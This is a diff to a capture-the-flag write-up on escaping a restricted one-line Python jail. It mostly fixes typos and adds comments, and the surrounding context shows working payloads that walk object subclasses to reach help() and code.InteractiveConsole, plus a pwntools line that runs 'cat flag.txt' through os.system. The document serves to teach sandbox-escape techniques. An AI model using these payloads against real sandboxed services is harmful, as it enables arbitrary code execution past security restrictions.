@@ -390,7 +390,7 @@ p.sendline(b'os.system("cat flag.txt")')
 p.interactive()
 ```
 
-It works locally with Python 3.8/3.10/3.11/3.12/3.13 since the indices are probed dynamically. If we can't probe the Python version remotely, we can try different indices from common Python versions.
+It works locally with Python 3.8/3.10/3.11/3.12/3.13 since the indices are probed dynamically. If we can't probe the Python version remotely, we can try different indices from common Python versions. If the lenght limit is smaller, we can reduce the length further by finding shorter way to compute the integers, e.g. defining `T:=True`.
 
 ### Use pdb module
 
@@ -493,7 +493,7 @@ Adapt the script above to load `pdb` module instead. Then, we can execute what w
 
 ## Explain the writeups above
 
-Now we can explain the wriups by folks on Discord:
+Now we can explain the writeups by folks on Discord:
 
 @hibwyli:
 
@@ -563,6 +563,7 @@ object
 
 ```python
 # step 1. run help()
+# z=2, t=9*2+1=19, zt=19*8+2*3+1=159
 # 159 is the index of _sitebuiltins._Helper
 >> [y:=().__doc__,ww:=True,z:=ww+ww,t:=z+z+z+z+z+z+z+z+z+ww,zt:=t+t+t+t+t+t+t+t+z+z+z+ww,a:=().__class__.__base__.__subclasses__]
 ["Built-in immutable sequence.\n\nIf no argument is given, the constructor returns an empty tuple.\nIf iterable is specified the tuple is initialized from iterable's items.\n\nIf the argument is a tuple, the return value is the same object.", True, 2, 19, 159, <built-in method __subclasses__ of type object at 0x7efe341e6040>]
@@ -577,7 +578,7 @@ object
 # ww-ww-ww-ww-ww is -4, code.InteractiveConsole is a subclass of code.InteractiveInterpreter
 >> [y:=().__doc__,ww:=True,z:=ww+ww,t:=z+z+z+z+z+z+z+z+z+ww,zt:=t+t+t+t+t+t+t+t+z+z+z+ww,a:=().__class__.__base__.__subclasses__,w:=a()[zt]()(),a()[ww-ww-ww-ww-ww].__subclasses__()[False]]
 ["Built-in immutable sequence.\n\nIf no argument is given, the constructor returns an empty tuple.\nIf iterable is specified the tuple is initialized from iterable's items.\n\nIf the argument is a tuple, the return value is the same object.", True, 2, 19, 159, <built-in method __subclasses__ of type object at 0x7efe341e6040>, None, <class 'code.InteractiveConsole'>]
-# get interactive shell
+# get interactive shell by code.InteractiveConsole().interact()
 >> [y:=().__doc__,ww:=True,z:=ww+ww,t:=z+z+z+z+z+z+z+z+z+ww,zt:=t+t+t+t+t+t+t+t+z+z+z+ww,a:=().__class__.__base__.__subclasses__,w:=a()[zt]()(),a()[ww-ww-ww-ww-ww].__subclasses__()[False]().interact()]
 
 https://github.com/mmm-team/public-writeups/blob/d592f318b5daa813b89d4b1bae323862fda911de/seccon2024/jail_1linepyjail/README.md?plain=1#L15
